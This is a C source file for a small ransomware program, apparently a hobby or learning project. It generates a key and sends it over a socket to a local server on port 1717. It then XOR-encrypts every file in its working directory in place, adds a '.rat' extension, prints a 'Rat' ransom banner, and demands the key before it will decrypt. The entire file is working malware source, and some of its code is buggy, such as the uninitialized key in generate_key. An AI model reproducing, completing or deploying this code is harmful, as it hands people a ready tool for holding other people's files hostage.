#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dirent.h> 
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#define PORT 1717

#define RANSOM_VERSION 1
#define MAGIC_LEN 1000
#define MAGIC_KEY 2

#define DBG

/*
This funciton encrypt the memory of buffer.
input:
buffer - the pointer to the buffer for encryption.
size - the size of the buffer.
key - key for encryption.
output: null.
*/
void encrypt_mem(char *buffer, size_t size, unsigned long key) {
    //loop over all the buffer
    for (size_t i = 0; i < size; i++) {
        buffer[i] ^= (key >> ((i % 8) * 8)) & 0xFF;
    }
}

/*
This funciton decrypt the memory of buffer.
input:
buffer - the pointer to the buffer for encryption.
size - the size of the buffer.
key - key for encryption.
output: null.
*/
void decrypt_mem(char *buffer, size_t size, unsigned long key) {
    //loop over all the buffer
    for (size_t i = 0; i < size; i++) {
        buffer[i] ^= (key >> ((i % 8) * 8)) & 0xFF;
    }
}

/*
This function check if the file name isnt "." | ".." | "ransom".
input:
file - the file name.
output: if the name is valid.
*/
int valid_file(const char* file) {
    return strcmp(file, ".") && strcmp(file, "..") && strcmp(file, "ransom");
}

/*
This function send the key to the server.
input:
key - the key to send to the server.
output: null.
*/
void send_key(unsigned long key){
    int sock = 0;
    struct sockaddr_in serv_addr;

    // Create socket file descriptor
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convert IPv4 and IPv6 addresses from text to binary form
    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        exit(EXIT_FAILURE);
    }

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection Failed");
        exit(EXIT_FAILURE);
    }

    // Convert unsigned long to a byte array
    unsigned char buffer[sizeof(unsigned long)];
    for (int i = 0; i < sizeof(unsigned long); ++i) {
        buffer[i] = (key >> (i * 8)) & 0xFF;
    }

    // Send the byte array to the server
    send(sock, buffer, sizeof(unsigned long), 0);

#ifdef DBG
    printf("Sent unsigned long value: %lu\n", key);
#endif

    close(sock);
}

/*
This function authorized the key by manipulate it with some actions and return it back.
input:
key - the key to authorized.
output: the key after the authorized.
*/
unsigned long authorized_key(unsigned long key){
    char magic = (char)key;
    magic &= 0x0F;
    key = key << 1;
    key += 1;
    key = key << 4;
    key += magic;
    key = key << 1;    

    return key;
}

/*
This function get key and return if it valid by the key syntax.
input:
key - the key for check.
output: if the key is valid.
*/
int validation_key(unsigned long key){
    char magic_1, magic_2;

    //Check if the number is even
    if(key % 2 != 0){
        return 0;
    }

    //get the 4 bits of the magic 1
    key = key >> 1;
    magic_1 = (char)key;
    magic_1 &= 0x0F;

    key = key >> 4;

    //check if the validation number is 1
    if(key % 2 != 1){
        return 0;
    }
    
    //get the 4 bits of the magic 2
    key = key >> 1;
    magic_2 = (char)key;
    magic_2 &= 0x0F;

    //check if the two magics numbers is equals
    if(magic_1 != magic_2)  {
        return 0;
    }
    return 1;
}

/*
This functions generate new key.
input: null.
output: the key number.
*/
unsigned long generate_key(void){
    unsigned long key;
    int i = 0;
    srand(time(NULL));  

    //rand return 2 bytes of random number, then store all the numbers in the key.
    for(i = 0; i < sizeof(unsigned long); i += 2){
        key += rand();
        key << 2;
    }
    
    //authorized the key...
    key = authorized_key(key);

    return key;
}

/*
This function encrypt all the files in the folder.
input:
key - the key for encryption.
dir_name - the  path to the dir for encryption.
output: null.
*/
void encrypt_dir(unsigned long key, char* dir_name){
    DIR *d;
    struct dirent *dir;
    d = opendir(dir_name);

    //check if the dir is exists.
    if (d) {
        //loop over all the dir
        while ((dir = readdir(d)) != NULL) {
            int fd;
            
            unsigned char buffer[1024];  // Buffer to store read data

            // Open file in read and write binary mode
            struct stat path_stat;
            if (stat(dir->d_name, &path_stat) != 0) {
                perror("stat");
                return;
            }

            //check if the path is of file or dir.
            if (!S_ISDIR(path_stat.st_mode) && valid_file(dir->d_name)) {
                fd = open(dir->d_name, O_RDWR);

                // Map the file into memory
                char *file_contents = mmap(NULL, path_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
                if (file_contents == MAP_FAILED) {
                    perror("Error mapping file to memory");
                    close(fd);
                    return;
                }

                //encrypt the memory of the file with the key
                encrypt_mem(file_contents, path_stat.st_size, key);
                
                //unmap of file content from the memory
                if (munmap(file_contents, path_stat.st_size) == -1) {
                    perror("Error unmapping file from memory");
                    close(fd);
                    return;
                }

                // Close the file
                close(fd);

                const char* suffix = ".rat";
                char new_name[256]; // Assuming maximum file name length is 255 characters

                // Copy the old name to the new name buffer
                strcpy(new_name, dir->d_name);

                // Append the suffix to the new name
                strcat(new_name, suffix);
                // Unmap the file from memory
                rename(dir->d_name, new_name);
            }
        } 
    } 
}

/*
This function decrypt all the files in the folder.
input:
key - the key for decryption.
dir_name - the  path to the dir for decryption.
output: null.
*/
void decrypt_dir(unsigned long key, char* dir_name){
    DIR *d;
    struct dirent *dir;
    d = opendir(dir_name);

    //check if the dir is exists.
    if (d) {
        //loop over all the dir
        while ((dir = readdir(d)) != NULL) {
            int fd;
            
            unsigned char buffer[1024];  // Buffer to store read data

            // Open file in read and write binary mode
            struct stat path_stat;
            if (stat(dir->d_name, &path_stat) != 0) {
                perror("stat");
                return;
            }

            //check if the path is of file or dir.
            if (!S_ISDIR(path_stat.st_mode) && valid_file(dir->d_name)) {
                fd = open(dir->d_name, O_RDWR);

                // Map the file into memory
                char *file_contents = mmap(NULL, path_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
                if (file_contents == MAP_FAILED) {
                    perror("Error mapping file to memory");
                    close(fd);
                    return;
                }

                //decrypt the memory of the file with the key
                decrypt_mem(file_contents, path_stat.st_size, key);
                
                //unmap of file content from the memory
                if (munmap(file_contents, path_stat.st_size) == -1) {
                    perror("Error unmapping file from memory");
                    close(fd);
                    return;
                }

                // Close the file
                close(fd);

                char new_name[256]; // Assuming maximum file name length is 255 characters

                // Copy the old name to the new name buffer
                strcpy(new_name, dir->d_name);
                new_name[strlen(dir->d_name) - 4] = '\0';

                // Unmap the file from memory
                rename(dir->d_name, new_name);
            }
        } 
    } 
}

/*
This function start ransom dialog with the user.
input: null.
output: key for decryption.
*/
unsigned long ransom_dialog(void){  
    unsigned long key;                                                                                                                    
    system("clear");
    printf("RRRRRRRRRRRRRRRRR                             tttt          \n");
    printf("R::::::::::::::::R                         ttt:::t          \n");
    printf("R::::::RRRRRR:::::R                        t:::::t          \n");
    printf("RR:::::R     R:::::R                       t:::::t          \n");
    printf("  R::::R     R:::::R  aaaaaaaaaaaaa  ttttttt:::::ttttttt    \n");
    printf("  R::::R     R:::::R  a::::::::::::a t:::::::::::::::::t    \n");
    printf("  R::::RRRRRR:::::R   aaaaaaaaa:::::at:::::::::::::::::t    \n");
    printf("  R:::::::::::::RR             a::::atttttt:::::::tttttt    \n");
    printf("  R::::RRRRRR:::::R     aaaaaaa:::::a      t:::::t          \n");
    printf("  R::::R     R:::::R  aa::::::::::::a      t:::::t          \n");
    printf("  R::::R     R:::::R a::::aaaa::::::a      t:::::t          \n");
    printf("  R::::R     R:::::Ra::::a    a:::::a      t:::::t    tttttt\n");
    printf("RR:::::R     R:::::Ra::::a    a:::::a      t::::::tttt:::::t\n");
    printf("R::::::R     R:::::Ra:::::aaaa::::::a      tt::::::::::::::t\n");
    printf("R::::::R     R:::::R a::::::::::aa:::a       tt:::::::::::tt\n");
    printf("RRRRRRRR     RRRRRRR  aaaaaaaaaa  aaaa         ttttttttttt  \n\n\n");

    //get the key from the user
    do {

        printf("Key: ");
        scanf("%lu", &key);
        getchar();

    } while (!validation_key(key)); //loop until the user give valid key    

    return key;
}

int main(void){
    //key scope
    {
        //generate new random key
        unsigned long key = generate_key();

        //send the key to the server
        send_key(key);

        //encrypt the curr dir of the ransom
        encrypt_dir(key, ".");

        //delete the key from the stack
        key ^= key;        
    }    

    //get the key from the user then decrypt the data
    decrypt_dir(ransom_dialog(), ".");

    return 0;
}